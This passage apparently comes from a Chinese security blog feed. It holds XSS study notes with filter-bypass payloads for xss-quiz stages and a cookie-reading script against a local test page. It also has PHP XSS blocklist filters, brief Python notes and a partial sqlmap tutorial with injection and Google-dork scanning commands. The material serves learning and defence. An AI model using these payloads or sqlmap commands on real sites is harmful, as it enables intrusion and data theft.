class="headerlink" title="注释绕过关键字过滤"></a>注释绕过关键字过滤</h3><blockquote><p>stage #14</p><p><a href="https://xss-quiz.int21h.jp/stage-_-14.php?sid=eb2573e964a61b65bc4d456c9fae630ac19266c2" target="_blank" rel="noopener">https://xss-quiz.int21h.jp/stage-_-14.php?sid=eb2573e964a61b65bc4d456c9fae630ac19266c2</a></p></blockquote><p><code>/**/</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xss:expres<span class="comment">/**/</span>sion(<span class="keyword">if</span>(!<span class="built_in">window</span>.x)&#123;alert(<span class="built_in">document</span>.domain);<span class="built_in">window</span>.x=<span class="number">1</span>;&#125;)</span><br></pre></td></tr></table></figure><h2 id="16进制绕过过滤触发xss"><a href="#16进制绕过过滤触发xss" class="headerlink" title="16进制绕过过滤触发xss"></a>16进制绕过过滤触发xss</h2><p>符号 -&gt; 16</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> binascii</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">"\\x"</span>+binascii.b2a_hex(<span class="string">"&lt;"</span>)</span><br></pre></td></tr></table></figure><p>带上\x,js 可识别 </p><blockquote><p>stage #15</p><p><a href="https://xss-quiz.int21h.jp/stage__15.php?sid=e4954d390fd0e5d6a8dd4d1f3647e7f4095bcf2e" target="_blank" rel="noopener">https://xss-quiz.int21h.jp/stage__15.php?sid=e4954d390fd0e5d6a8dd4d1f3647e7f4095bcf2e</a></p></blockquote><p>经检测，&lt; &gt; \ 被过滤，&lt; 16进制为3c  &gt;16进制为3e</p><p><img src="%5Cimages%5Cxss_stage15.png" alt></p><p><img src="%5Cimages%5Cxss_stage15_1.png" alt></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\x3cscript\\x3ealert(<span class="built_in">document</span>.domain);\\x3c/script\\x3e</span><br></pre></td></tr></table></figure><h2 id="Ascii绕过过滤触发xss"><a href="#Ascii绕过过滤触发xss" class="headerlink" title="Ascii绕过过滤触发xss"></a>Ascii绕过过滤触发xss</h2><p>符号 -&gt; ascii</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> binascii</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">"\\u00"</span> + binascii.b2a_hex(<span class="string">"&lt;"</span>)</span><br></pre></td></tr></table></figure><blockquote><p>stage #16</p><p><a href="https://xss-quiz.int21h.jp/stage00000016.php?sid=5286887e32a1526dc007701ca9e159eed22b992e" target="_blank" rel="noopener">https://xss-quiz.int21h.jp/stage00000016.php?sid=5286887e32a1526dc007701ca9e159eed22b992e</a></p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\u003cscript\\u003ealert(<span class="built_in">document</span>.domain);\\u003c/script\\u003e</span><br></pre></td></tr></table></figure><h2 id="源"><a href="#源" class="headerlink" title="源"></a>源</h2><p>源：由协议，主机名，端口名组成（例：协议://主机名:端口号/）</p><p>同源策略（SOP）：用于阻止一个非同源的页面恶意代码去访问另外一个非同源页面</p><h3 id="ie的特殊处理"><a href="#ie的特殊处理" class="headerlink" title="ie的特殊处理"></a>ie的特殊处理</h3><p>1.位于可信域的互信的域名间，不受同源策略限制</p><p>2.ie在判断同源时不考虑端口</p><h3 id="document-domain"><a href="#document-domain" class="headerlink" title="document.domain"></a>document.domain</h3><p>可通过document.domain读取或修改源；但有限制，修改之后的源不能通过其他脚本再次修改。</p><p>domain属性可以解决因同源安全策略带来的不同文档的属性共享问题</p><p>降域 document.domain,同源策略认为域和子域属于不同的域，如child.a.com 与 a.ocm,child2.a.com与child1.a.com,两两不同源，可设置document.domain=”a.com”,就同源了；想要设置以上任意两个页面通信 ，两个页面都必须设置document.domain=”a.com”。</p><h2 id="cookie的httponly设置"><a href="#cookie的httponly设置" class="headerlink" title="cookie的httponly设置"></a>cookie的httponly设置</h2><p>消除cookie：Internet选项，常规</p><h3 id="cookie-httponly"><a href="#cookie-httponly" class="headerlink" title="cookie httponly"></a>cookie httponly</h3><p>setcookie(“abc”,”test”,NULL,NULL,NULL,NULL,TRUE);设置secure参数为true之后，就不能使用js获取cookie</p><p>setcookie(<code>name</code>(必须。规定名称),<code>value</code>(必须，规定值),<code>expire</code>(有效期),<code>path</code>(服务器路径),<code>domain</code>( 域名),<code>secure</code>(是否通过安全的https连接来传输cookie),<code>httponly</code>)</p><p>在本地实验：</p><p><code>tescookie.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    setcookie(<span class="string">"user"</span>,<span class="string">"admin"</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">FALSE</span>);</span><br><span class="line">    setcookie(<span class="string">"pass"</span>,<span class="string">"admin"</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">TRUE</span>);</span><br><span class="line">    $id = $_GET[<span class="string">"id"</span>];</span><br><span class="line">    <span class="keyword">echo</span> $id;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/testcookie.php?id=%3Cscript%3Edocument.write(document.cookie);%3C/script%3E</span><br></pre></td></tr></table></figure><p>就会输出 user=admin，TRUE的pass就不会输出。</p><h2 id="xss-filter-过滤器"><a href="#xss-filter-过滤器" class="headerlink" title="xss-filter 过滤器"></a>xss-filter 过滤器</h2><h3 id="防御函数"><a href="#防御函数" class="headerlink" title="防御函数"></a>防御函数</h3><p><strong><a href="https://www.w3school.com.cn/php/func_string_htmlspecialchars.asp" target="_blank" rel="noopener">htmlspecialchars()函数</a></strong></p><p>把预定义的字符转换为html实体</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">htmlspecialchars(string,flags,character-set,double_encode)</span><br></pre></td></tr></table></figure><p><strong><a href="https://www.w3school.com.cn/php/func_string_htmlentities.asp" target="_blank" rel="noopener">htmlentities()函数</a></strong></p><p> 过滤用户输入的数据，将一些特殊字符串转换为html实体。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">htmlentities(string,flags,character-set,double_encode)</span><br></pre></td></tr></table></figure><p><strong><a href="https://www.w3school.com.cn/php/func_string_strip_tags.asp" target="_blank" rel="noopener">strip_tags()函数</a></strong></p><p>剥去字符串中得html、xml以及php的标签。</p><blockquote><p>该函数会剥离html注释，这点无法通过allow参数改变。</p><p>该函数是二进制安全的。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strip_tags(string,allow)</span><br></pre></td></tr></table></figure><p><strong>自定义xss filter</strong></p><blockquote><p>法一</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xss_clean</span><span class="params">($data)</span></span>&#123;</span><br><span class="line"> <span class="comment">// Fix &amp;entity＼n;</span></span><br><span class="line"> $data=str_replace(<span class="keyword">array</span>(<span class="string">'&amp;'</span>,<span class="string">'&lt;'</span>,<span class="string">'&gt;'</span>),<span class="keyword">array</span>(<span class="string">'&amp;amp;'</span>,<span class="string">'&amp;lt;'</span>,<span class="string">'&amp;gt;'</span>),$data);</span><br><span class="line"> $data=preg_replace(<span class="string">'/(&amp;#*＼w+)[＼x00-＼x20]+;/u'</span>,<span class="string">'$1;'</span>,$data);</span><br><span class="line"> $data=preg_replace(<span class="string">'/(&amp;#x*[0-9A-F]+);*/iu'</span>,<span class="string">'$1;'</span>,$data);</span><br><span class="line"> $data=html_entity_decode($data,ENT_COMPAT,<span class="string">'UTF-8'</span>);</span><br><span class="line"> <span class="comment">// Remove any attribute starting with "on" or xmlns</span></span><br><span class="line"> $data=preg_replace(<span class="string">'#(&lt;[^&gt;]+?[＼x00-＼x20"＼'</span>])(?:on|xmlns)[^&gt;]*+&gt;<span class="comment">#iu','$1&gt;',$data);</span></span><br><span class="line"> <span class="comment">// Remove javascript: and vbscript: protocols</span></span><br><span class="line"> $data=preg_replace(<span class="string">'#([a-z]*)[＼x00-＼x20]*=[＼x00-＼x20]*([`＼'</span><span class="string">"]*)[＼x00-＼x20]*j[＼x00-＼x20]*a[＼x00-＼x20]*v[＼x00-＼x20]*a[＼x00-＼x20]*s[＼x00-＼x20]*c[＼x00-＼x20]*r[＼x00-＼x20]*i[＼x00-＼x20]*p[＼x00-＼x20]*t[＼x00-＼x20]*:#iu','$1=$2nojavascript...',$data);</span></span><br><span class="line"><span class="string"> $data=preg_replace('#([a-z]*)[＼x00-＼x20]*=([＼'"</span>]*)[＼x00-＼x20]*v[＼x00-＼x20]*b[＼x00-＼x20]*s[＼x00-＼x20]*c[＼x00-＼x20]*r[＼x00-＼x20]*i[＼x00-＼x20]*p[＼x00-＼x20]*t[＼x00-＼x20]*:<span class="comment">#iu','$1=$2novbscript...',$data);</span></span><br><span class="line"> $data=preg_replace(<span class="string">'#([a-z]*)[＼x00-＼x20]*=([＼'</span><span class="string">"]*)[＼x00-＼x20]*-moz-binding[＼x00-＼x20]*:#u','$1=$2nomozbinding...',$data);</span></span><br><span class="line"><span class="string"> // Only works in IE: &lt;span style="</span>width: expression(alert(<span class="string">'Ping!'</span>));<span class="string">"&gt;&lt;/span&gt;</span></span><br><span class="line"><span class="string"> $data=preg_replace('#(&lt;[^&gt;]+?)style[＼x00-＼x20]*=[＼x00-＼x20]*[`＼'"</span>]*.*?expression[＼x00-＼x20]*＼([^&gt;]*+&gt;<span class="comment">#i','$1&gt;',$data);</span></span><br><span class="line"> $data=preg_replace(<span class="string">'#(&lt;[^&gt;]+?)style[＼x00-＼x20]*=[＼x00-＼x20]*[`＼'</span><span class="string">"]*.*?behaviour[＼x00-＼x20]*＼([^&gt;]*+&gt;#i','$1&gt;',$data);</span></span><br><span class="line"><span class="string"> $data=preg_replace('#(&lt;[^&gt;]+?)style[＼x00-＼x20]*=[＼x00-＼x20]*[`＼'"</span>]*.*?s[＼x00-＼x20]*c[＼x00-＼x20]*r[＼x00-＼x20]*i[＼x00-＼x20]*p[＼x00-＼x20]*t[＼x00-＼x20]*:*[^&gt;]*+&gt;<span class="comment">#iu','$1&gt;',$data);</span></span><br><span class="line"> <span class="comment">// Remove namespaced elements (we do not need them)</span></span><br><span class="line"> $data=preg_replace(<span class="string">'#&lt;/*＼w+:＼w[^&gt;]*+&gt;#i'</span>,<span class="string">''</span>,$data);</span><br><span class="line"> <span class="keyword">do</span>&#123;<span class="comment">// Remove really unwanted tags</span></span><br><span class="line"> $old_data=$data;</span><br><span class="line"> $data=preg_replace(<span class="string">'#&lt;/*(?:applet|b(?:ase|gsound|link)|embed|frame(?:set)?|i(?:frame|layer)|l(?:ayer|ink)|meta|object|s(?:cript|tyle)|title|xml)[^&gt;]*+&gt;#i'</span>,<span class="string">''</span>,$data);</span><br><span class="line"> &#125;<span class="keyword">while</span>($old_data!==$data);</span><br><span class="line"> <span class="comment">// we are done...</span></span><br><span class="line"> <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>法二</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//php防注入和XSS攻击通用过滤.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//by qq:831937</span></span><br><span class="line"></span><br><span class="line">$_GET    &amp;&amp; SafeFilter($_GET);</span><br><span class="line">$_POST   &amp;&amp; SafeFilter($_POST);</span><br><span class="line">$_COOKIE &amp;&amp; SafeFilter($_COOKIE);</span><br><span class="line">functionSafeFilter (&amp;$arr)</span><br><span class="line">&#123; </span><br><span class="line">   $ra=<span class="keyword">Array</span>(<span class="string">'/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/'</span>,<span class="string">'/script/'</span>,<span class="string">'/javascript/'</span>,<span class="string">'/vbscript/'</span>,<span class="string">'/expression/'</span>,<span class="string">'/applet/'</span>,<span class="string">'/meta/'</span>,<span class="string">'/xml/'</span>,<span class="string">'/blink/'</span>,<span class="string">'/link/'</span>,<span class="string">'/style/'</span>,<span class="string">'/embed/'</span>,<span class="string">'/object/'</span>,<span class="string">'/frame/'</span>,<span class="string">'/layer/'</span>,<span class="string">'/title/'</span>,<span class="string">'/bgsound/'</span>,<span class="string">'/base/'</span>,<span class="string">'/onload/'</span>,<span class="string">'/onunload/'</span>,<span class="string">'/onchange/'</span>,<span class="string">'/onsubmit/'</span>,<span class="string">'/onreset/'</span>,<span class="string">'/onselect/'</span>,<span class="string">'/onblur/'</span>,<span class="string">'/onfocus/'</span>,<span class="string">'/onabort/'</span>,<span class="string">'/onkeydown/'</span>,<span class="string">'/onkeypress/'</span>,<span class="string">'/onkeyup/'</span>,<span class="string">'/onclick/'</span>,<span class="string">'/ondblclick/'</span>,<span class="string">'/onmousedown/'</span>,<span class="string">'/onmousemove/'</span>,<span class="string">'/onmouseout/'</span>,<span class="string">'/onmouseover/'</span>,<span class="string">'/onmouseup/'</span>,<span class="string">'/onunload/'</span>);</span><br><span class="line">   <span class="keyword">if</span>(is_array($arr))</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">foreach</span>($arras</span><br><span class="line">$key  =&gt; $value)</span><br><span class="line">     &#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_array($value))</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span>(!get_magic_quotes_gpc())             <span class="comment">//不对magic_quotes_gpc转义过的字符使用addslashes(),避免双重转义。</span></span><br><span class="line">          &#123;</span><br><span class="line">             $value = addslashes($value);          <span class="comment">//给单引号（'）、双引号（"）、反斜线（\）与 NUL（NULL 字符）加上反斜线转义</span></span><br><span class="line">          &#125;</span><br><span class="line">          $value      = preg_replace($ra,<span class="string">''</span>,$value);    <span class="comment">//删除非打印字符，粗暴式过滤xss可疑字符串</span></span><br><span class="line">          $arr[$key]     = htmlentities(strip_tags($value));<span class="comment">//去除 HTML 和 PHP 标记并转换为 HTML 实体</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          SafeFilter($arr[$key]);</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="编码转义"><a href="#编码转义" class="headerlink" title="编码转义"></a>编码转义</h2><h3 id="url编码"><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h3><p>将不安全的字符编码为安全字符在进行传输（通用得安全字母表）</p><p>%+两个表示字符ascii的16进制数</p><h3 id="html编码"><a href="#html编码" class="headerlink" title="html编码"></a>html编码</h3><p>一些保留字符出现在文本节点和标签值里不安全，如“&lt;&gt;”会导致刘安琪误以为标签</p><p>实体编码</p><p>一般&amp;开头，“;”结尾，可不加“；”。如”&lt;”转为”&lt;”</p><p>进制编码</p><p>以&amp;#开头，加上字符的数值，”;”结尾可不加。字符数值可以是任意十进制ASCII码或Unicode字符编码，十六进制的数值需要在编码数字前加”x“ .</p><h3 id="js编码"><a href="#js编码" class="headerlink" title="js编码"></a>js编码</h3><p>\u +00 + ASCII码</p><p>\x + ASCII码</p><p><a href="http://utf-8.jp/public/jsfuck.html" target="_blank" rel="noopener">jsfuck</a></p><h3 id="编码含义"><a href="#编码含义" class="headerlink" title="编码含义"></a>编码含义</h3><p>攻击绕过</p><h2 id="xss过滤器绕过"><a href="#xss过滤器绕过" class="headerlink" title="xss过滤器绕过"></a>xss过滤器绕过</h2><p>xss payload测试</p><p>kali路径：/usr/share/wordlists/wfuzz/Injections/xss.txt</p><p>自动化探测，burp:Intruder模块，在positions设置注入位置；在payload中设置payload type为runtime file然后选择对应的xss payload，之后start attack。</p><p><strong>关注最新的html等内容</strong></p><p>例如更新了新标签，可进行xss测试</p><p>参考 ：owasp.org</p><h2 id="xss发生的位置"><a href="#xss发生的位置" class="headerlink" title="xss发生的位置"></a>xss发生的位置</h2><h3 id="get型url中的xss"><a href="#get型url中的xss" class="headerlink" title="get型url中的xss"></a>get型url中的xss</h3><p>如果url修改提交的参数值,在页面显示，很有可能存在(反射)xss</p><h3 id="post表单中的xss"><a href="#post表单中的xss" class="headerlink" title="post表单中的xss"></a>post表单中的xss</h3><p>在表单中的提交修改的参数值，在页面中显示，很有可能存在xss</p><p>form data</p><h3 id="json中的xss"><a href="#json中的xss" class="headerlink" title="json中的xss"></a>json中的xss</h3><p>json(javascript object notation)是一种轻量级的数据交换格式，易于人阅读和编写，同时也易于机器解析和生成，并有效的提升网络传输效率</p><p>json 最常见的格式是对象的键值对</p><p>闭合前面+;alert(“xss”);//注释后面</p><h3 id="自定义http头中的xss"><a href="#自定义http头中的xss" class="headerlink" title="自定义http头中的xss"></a>自定义http头中的xss</h3><p>如果在http自定义头中提交的参数值，在页面中显示。很有可能存在xss</p><h2 id="存储型xss灰盒测试"><a href="#存储型xss灰盒测试" class="headerlink" title="存储型xss灰盒测试"></a>存储型xss灰盒测试</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>PHPstuday:搭建微程序，rocboss</p><p>定向xss挖掘:探测漏洞位置，能存储的地方</p><p>黑名单审计：查看filter，绕过黑名单</p><p>绕过过滤，触发xss：绕过并针对漏洞攻击</p><h2 id="自动挖掘工具"><a href="#自动挖掘工具" class="headerlink" title="自动挖掘工具"></a>自动挖掘工具</h2><p>xsser介绍：针对web应用程序自动化挖掘，利用，报告xss漏洞的框架</p><p>原理：不断拼接payload</p><p>帮助信息： xsser -h</p><p>启动方式： 图像化 xsser- gtk</p><p><a href="https://github.com/s0md3v/XSStrike" target="_blank" rel="noopener">xsstrike</a></p><blockquote><p>stage #17</p><p><a href="https://xss-quiz.int21h.jp/stage-No17.php?sid=4f0dacf93ef764da56fd687692abc63e1a31e095" target="_blank" rel="noopener">https://xss-quiz.int21h.jp/stage-No17.php?sid=4f0dacf93ef764da56fd687692abc63e1a31e095</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> xss </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python笔记</title>
      <link href="/2019/08/04/python%E7%AC%94%E8%AE%B0/"/>
      <url>/2019/08/04/python%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>python</p><a id="more"></a><h2 id="不怕念起-就怕觉迟-理可顿悟-事须渐修"><a href="#不怕念起-就怕觉迟-理可顿悟-事须渐修" class="headerlink" title="不怕念起 就怕觉迟 理可顿悟 事须渐修"></a>不怕念起 就怕觉迟 理可顿悟 事须渐修</h2><h2 id="人们常觉得准备的阶段是在浪费时间。只有真正机会来临，-而自己没有能力把握的时候，-才知道自己平时没有准备才是浪费了时间。-–罗曼·罗兰"><a href="#人们常觉得准备的阶段是在浪费时间。只有真正机会来临，-而自己没有能力把握的时候，-才知道自己平时没有准备才是浪费了时间。-–罗曼·罗兰" class="headerlink" title="人们常觉得准备的阶段是在浪费时间。只有真正机会来临，          而自己没有能力把握的时候， 才知道自己平时没有准备才是浪费了时间。                                                                                                –罗曼·罗兰"></a>人们常觉得准备的阶段是在浪费时间。只有真正机会来临，          而自己没有能力把握的时候， 才知道自己平时没有准备才是浪费了时间。                                                                                                –罗曼·罗兰</h2><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><h3 id="方法："><a href="#方法：" class="headerlink" title="方法："></a>方法：</h3><p>a.append(45)：列表末尾添加45</p><p>a.insert(0,77): 在列表索引0位置添加元素77</p><p>a.count(s): s出现的次数</p><p>a.remove(244): 从列表中移除244</p><p>a.reverse() 反转整个列表</p><p> a.extend(b) b的所有元素添加到a末尾</p><p>a.sort() 小到大排序（前提可排）</p><p>del a[1] 删除索引1的元素</p><p>a.pop() 弹出末尾元素 a.pop(5)弹出索引5的元素</p><p>列表做栈和队列</p><h3 id="列表推导式"><a href="#列表推导式" class="headerlink" title="列表推导式"></a>列表推导式</h3><p>squares = list(map(lambda, x : x**2, range(10) ) )</p><p>squares = [x**2 for x in range(10) ]</p><p>遍历列表同时并返回元素索引值</p><p>for i, j in enumerate([‘a’, ‘b’, ‘c’])</p><h2 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h2><p>特性不可变</p><p>单个元素元组（123，）</p><h2 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h2><p>空集合 set{}</p><p>a.set(“asdfsdagsa”)</p><p>b.set(“dfsfsdg”)</p><p>a -&gt; a去重后的字母</p><p>a-b a有而b没有的字母</p><p>a | b 存在于a或b的字母</p><p>a&amp;b a与b都有的字母</p><p>a^b 存在于a或b,但不同时存在的字母</p><p>添加字母随机位置随机排列 a.add()  a.pop()</p><h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><p>空字典 {}</p><p>dict() 在包含键值对的元组中的创建字典</p><p>dict( ( ( “name”, “wang” ), ( “password “, “passwd “ ) ) )</p><p>item() 遍历一个字典 for x, y in a.item()</p><p>向子典中得元素添加数据，需判断元素是否存在，不存在需创建一个默认值</p><p>data = {}</p><p>data.setdefault(‘names’, []).append(‘python’)</p><p>索引一个不存在的键，会报错（keyerror）</p><p>data.get(‘foo’, 0) 不存在就会返回0</p><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>“字符串中有 /n 的时候” print输出会有换行。</p><p>方法：</p><p>split()</p><p>join()</p><p>strip() (l,r)</p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap详细使用教程</title>
      <link href="/2019/07/04/sqlmap%E8%AF%A6%E7%BB%86%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
      <url>/2019/07/04/sqlmap%E8%AF%A6%E7%BB%86%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>sqlmap 开源的渗透测工具</p><a id="more"></a><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>sqlmap 是开源的渗透测试工具，自动化检测sql注入漏洞，利用其漏洞获取数据库服务器的权限。它的检测引擎功能强大，对于不同类型的数据库的渗透测试，拥有不同的功能选项；既可以获取数据库中存储的数据，又可以访问操作系统文件，甚至可以通过外带数据连接的方式执行操作系统命令。</p><h3 id="安装与环境配置"><a href="#安装与环境配置" class="headerlink" title="安装与环境配置"></a>安装与环境配置</h3><p><a href="https://www.python.org/download/releases/2.7/" target="_blank" rel="noopener">sqlmap官网</a></p><p>下载python2.7，安装完成后，配置环境：</p><p>path内添加python安装路径，例如 D:\python</p><p><a href="https://www.cnblogs.com/huangbiquan/p/7784533.html" target="_blank" rel="noopener">环境配置教学</a></p><h2 id="确定探测目标"><a href="#确定探测目标" class="headerlink" title="确定探测目标"></a>确定探测目标</h2><h3 id="直连数据库"><a href="#直连数据库" class="headerlink" title="直连数据库"></a>直连数据库</h3><p><code>-d</code></p><p>数据库类型：文件型数据库（前提是知道数据库绝对路径），关系型数据库（前提是知道数据库用户名和密码）</p><p>连接关系型数据库 操作</p><blockquote><p>sqlmap -d “DBMS://User:Password@DBMS_Ip:DBMS_Port/DB_Name”  -f –banner -users</p><p>-d 表示直连  DBMS有mysql,oracle,microsofe sql server,psql,etc…</p><p>-f fetch 返回</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -d "mysql://root:123456@192.168.1.123:3306/test" -f --banner --users</span><br></pre></td></tr></table></figure><p>连接文件型数据库 操作</p><blockquote><p>同上，DBMS的种类有SQLite,microsofe Access,Firebird,etc…</p><p>sqlmap -d “DBMS://db_filepath”</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -d "DBMS://db_filepath"</span><br></pre></td></tr></table></figure><h3 id="指定URL"><a href="#指定URL" class="headerlink" title="指定URL"></a>指定URL</h3><p><code>-u</code></p><blockquote><p> sqlmap -u “<a href="http://targeturl[:port]/[目标文件文件夹]&quot;" target="_blank" rel="noopener">http://targeturl[:port]/[目标文件文件夹]&quot;</a></p><p>-u/–url 连接url</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "http://www.target.com/index.php?id=1" --banner</span><br></pre></td></tr></table></figure><h3 id="不同类型文件中读取目标"><a href="#不同类型文件中读取目标" class="headerlink" title="不同类型文件中读取目标"></a>不同类型文件中读取目标</h3><p><code>-l</code>    从burpsuit proxy或web Scarab proxy中读取Http请求的日志文件</p><p><code>-x</code>    从sitemap.xml站点地图文件中读取目标探测</p><p><code>-m</code>    从多行文本格式文件中读取多个目标，对多个目标进行探测</p><p><code>-r</code>    从文本文件中读取Http请求作为sql注入探测的目标</p><p><code>-c</code>    从配置文件sqlmap.conf 中读取目标探测</p><h3 id="google批量扫注入"><a href="#google批量扫注入" class="headerlink" title="google批量扫注入"></a>google批量扫注入</h3><p><code>-g</code></p><p>sqlmap通过-g自动利用Google hack的目标，然后利用交互向导模式进行sqlmap注入探测</p><blockquote><p>python sqlmap.py -g “inurl:&quot;.php?id=1&quot;“</p><p>Google hacking语法</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -g "inurl:.php?id="</span><br></pre></td></tr></table></figure><h2 id="请求参数设置"><a href="#请求参数设置" class="headerlink" title="请求参数设置"></a>请求参数设置</h2><h3 id="设置http请求方法"><a href="#设置http请求方法" class="headerlink" title="设置http请求方法"></a>设置http请求方法</h3><p><code>--method</code>=PUT</p><blockquote><p>默认为get    </p></blockquote><h3 id="设置post参数"><a href="#设置post参数" class="headerlink" title="设置post参数"></a>设置post参数</h3><p><code>--data</code></p><p>默认HTTP请求方法为get,但可以隐式的改为post(方法为提供post要发送的数据)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "http://www.target.php?id=1" --data="uname=adnin" -f --dbs --banner --users</span><br></pre></td></tr></table></figure><blockquote><p>-f （fingerprint）指纹</p><p>–data=”uname=admin”    post 发送的数据</p></blockquote><h3 id="设置参数分隔符"><a href="#设置参数分隔符" class="headerlink" title="设置参数分隔符"></a>设置参数分隔符</h3><p><code>--param-del</code>  指定分隔符</p><blockquote><p>默认为“&amp;”做分隔符</p></blockquote><p>在某些情况下，sqlmap需要覆盖默认参数分隔符（例如&amp; in Get和Post数据），才能正确地分割和单独处理每个参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "www.target.com/culnds.php" --data="query=foobar;id=1" --param-del=";" --banner</span><br></pre></td></tr></table></figure><blockquote><p>–param-del=”;”，特殊情况下(其中提交的数据是以“；”号做为分割符，sqlmap 无法识别正误)，指定参数分割，sqlmap才能判断。</p></blockquote><h3 id="设置cookie参数"><a href="#设置cookie参数" class="headerlink" 